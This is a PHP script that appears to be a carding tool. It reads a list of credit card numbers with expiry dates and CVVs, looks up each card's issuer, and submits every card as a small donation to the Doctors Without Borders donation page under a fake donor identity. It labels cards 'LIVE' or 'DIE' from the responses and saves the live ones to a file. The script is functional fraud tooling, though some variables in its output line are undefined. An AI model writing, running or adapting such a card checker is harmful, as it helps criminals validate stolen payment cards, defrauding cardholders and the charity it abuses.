<?php
$no = 1;
error_reporting(0);
echo "List CC : ";
$xyz = trim(fgets(STDIN));
echo "\n";
foreach (explode("\n", str_replace("\r", "", file_get_contents($xyz))) as $key => $akun) {
    $pecah = explode("|", trim($akun));
    $card = trim($pecah[0]);
    $month = trim($pecah[1]);
    $year = trim($pecah[2]);
    $cvv = trim($pecah[3]);
$headers = array();
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';

  $rest = substr("'.$card.'", 2, -12);
  $bin = curl('https://binlist.io/lookup/'.$rest.'/', null, null);
  $json = json_decode($bin[1], true);
  $type = $json['type'];
  $iin = $json['number']['iin'];
  $scheme = $json['scheme'];
  $cate = $json['category'];
  $country = $json['bank']['name'];
$lastCC = substr($cc_number, -4);
                $typeCC = (substr($cc_number,0,1) == 4 ? "2" : (substr($cc_number,0,1) == 5 ? "1" : (substr($cc_number,0,1) == 6 ? "4" : (substr($cc_number,0,1) == 3 ? "3" : null ))));
$gas = curl('https://donate.doctorswithoutborders.org/onetime.cfm', 'submitted=1&apple_pay_token=&apple_pay_paymentMethod=&apple_pay_billingContact=&apple_pay_shippingContact=&apple_pay_form_name=%2Fonetime.cfm&client_side_uuid=0B3A0FAA-D1C6-BB16-E15F8C3BECB09C6B&refer_type=&optimize_owls=&optimizelyhidden=&gift_type=onetime&gift_amount=other&other_gift_amount=5&card_type='.$typeCC.'&credit_card_number='.$card.'&cvv='.$cvv.'&card_expiration_month='.$month.'&card_expiration_year='.$year.'&echeck_account_type=&echeck_routing_number=&echeck_account_number=&acknowledgment_type=H&honoree_first_name=&honoree_last_name=&honoree_first_name_2=&honoree_last_name_2=&ecard=ecard&ecardID=20&recipient_title=&recipient_first_name=&recipient_last_name=&recipient_email=&ecard_send_date=05%2F20%2F2020&send_copy=1&sender_name=&sender_email=&personal_message=&from_company=0&company_name=&title=Mr.&first_name=apri&last_name=amsyah&address_1=37+Ginna+B.+Drive&address_apt=jakarta&city=jakarta&state=55&zip=97220&country=1&email=dowerarts%40gmail.com&enews=&phone=%28125%29+421-3123', $headers);
$name = get_between($gas[1], "<li>", "</li>");
    if (strpos($gas[1], 'There was an error processing your card')) {
        echo "[$no] DIE | $card|$month|$year|$cvv Bin Info : $iin - $scheme $type $cate $country\n";
    } else if (strpos($gas[1], 'Please enter a future expiration date within next 10 years')) {
        echo "[$no] Expired | $card|$month|$year|$cvv Bin Info : $iin - $scheme $type $cate $country\n";
    } else if (strpos($gas[1], 'Please enter a valid credit card number')) {
        echo "[$no] Card Not Valid | $card|$month|$year|$cvv Bin Info : $iin - $scheme $type $cate $country\n";
    } else {
        echo "[$no] LIVE | $card|$month|$year|$cvv Bin Info : $iin - $scheme $type $cate $country\n";
        fwrite(fopen("cc-live.txt", "a"), "$email | $passwd | Plan : $planname | Last Expire : $lastexpire\n");
}
    $no++;
}

function get_between($string, $start, $end) 
    {
        $string = " ".$string;
        $ini = strpos($string,$start);
        if ($ini == 0) return "";
        $ini += strlen($start);
        $len = strpos($string,$end,$ini) - $ini;
        return substr($string,$ini,$len);
    }

function curl($url,$post,$headers)
{
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_HEADER, 1);
	if ($headers !== null) curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
	if ($post !== null) curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
	$result = curl_exec($ch);
	// $header = substr($result, 0, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
	$body = substr($result, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
	preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $result, $matches);
	$cookies = array();
	foreach($matches[1] as $item) {
	  parse_str($item, $cookie);
	  $cookies = array_merge($cookies, $cookie);
	}
	return array (
	$headers,
	$body,
	$cookies
	);
}

function nama()
	{
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "http://ninjaname.horseridersupply.com/indonesian_name.php");
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	$ex = curl_exec($ch);
	// $rand = json_decode($rnd_get, true);
	preg_match_all('~(&bull; (.*?)<br/>&bull; )~', $ex, $name);
	return $name[2][mt_rand(0, 14) ];
	}

	class Console {
 
    static $foreground_colors = array(
        'bold'         => '1',    'dim'          => '2',
        'black'        => '0;30', 'dark_gray'    => '1;30',
        'blue'         => '0;34', 'light_blue'   => '1;34',
        'green'        => '0;32', 'light_green'  => '1;32',
        'cyan'         => '0;36', 'light_cyan'   => '1;36',
        'red'          => '0;31', 'light_red'    => '1;31',
        'purple'       => '0;35', 'light_purple' => '1;35',
        'brown'        => '0;33', 'yellow'       => '1;33',
        'light_gray'   => '0;37', 'white'        => '1;37',
        'normal'       => '0;39',
    );
    
    static $background_colors = array(
        'black'        => '40',   'red'          => '41',
        'green'        => '42',   'yellow'       => '43',
        'blue'         => '44',   'magenta'      => '45',
        'cyan'         => '46',   'light_gray'   => '47',
    );
 
    static $options = array(
        'underline'    => '4',    'blink'         => '5', 
        'reverse'      => '7',    'hidden'        => '8',
    );

    static $EOF = "\n";

    /**
     * Logs a string to console.
     * @param  string  $str        Input String
     * @param  string  $color      Text Color
     * @param  boolean $newline    Append EOF?
     * @param  [type]  $background Background Color
     * @return [type]              Formatted output
     */
    public static function log($str = '', $color = 'normal', $newline = true, $background_color = null)
    {
        if( is_bool($color) )
        {
            $newline = $color;
            $color   = 'normal';
        }
        elseif( is_string($color) && is_string($newline) )
        {
            $background_color = $newline;
            $newline          = true;
        }
        $str = $newline ? $str . self::$EOF : $str;

        echo self::$color($str, $background_color);
    }
    
    /**
     * Anything below this point (and its related variables):
     * Colored CLI Output is: (C) Jesse Donat
     * https://gist.github.com/donatj/1315354
     * -------------------------------------------------------------
     */
    
    /**
     * Catches static calls (Wildcard)
     * @param  string $foreground_color Text Color
     * @param  array  $args             Options
     * @return string                   Colored string
     */
    public static function __callStatic($foreground_color, $args)
    {
        $string         = $args[0];
        $colored_string = "";
 
        // Check if given foreground color found
        if( isset(self::$foreground_colors[$foreground_color]) ) {
            $colored_string .= "\033[" . self::$foreground_colors[$foreground_color] . "m";
        }
        else{
            die( $foreground_color . ' not a valid color');
        }
        
        array_shift($args);

        foreach( $args as $option ){
            // Check if given background color found
            if(isset(self::$background_colors[$option])) {
                $colored_string .= "\033[" . self::$background_colors[$option] . "m";
            }
            elseif(isset(self::$options[$option])) {
                $colored_string .= "\033[" . self::$options[$option] . "m";
            }
        }
        
        // Add string and end coloring
        $colored_string .= $string . "\033[0m";
        
        return $colored_string;
        
    }
 
    /**
     * Plays a bell sound in console (if available)
     * @param  integer $count Bell play count
     * @return string         Bell play string
     */
    public static function bell($count = 1) {
        echo str_repeat("\007", $count);
    }
 
}	
